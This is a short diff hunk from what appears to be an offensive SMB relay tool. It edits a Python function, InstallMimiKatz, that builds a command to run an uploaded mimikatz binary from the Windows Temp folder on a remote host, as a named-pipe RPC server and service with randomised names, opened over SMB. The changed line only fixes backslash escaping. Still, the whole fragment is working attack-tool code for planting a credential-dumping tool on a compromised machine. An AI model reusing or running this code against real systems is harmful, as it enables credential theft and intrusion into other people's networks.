@@ -1954,7 +1954,7 @@ def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, Fi
         RandomFName      = GenerateRandomFileName()
         WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
         #Install mimikatz as a service.
-        Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\pipe\\"+NamedPipe+" /guid:{"+DisplayGUID+"} /noreg\" service::me exit"
+        Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\\pipe\\"+NamedPipe+" /guid:{"+DisplayGUID+"} /noreg\" service::me exit"
         MimiKatzSVCName  = GenerateServiceName()
         MimiKatzSVCID    = GenerateServiceID()
         data,s           = SMBOpenPipe(Host, data, s)
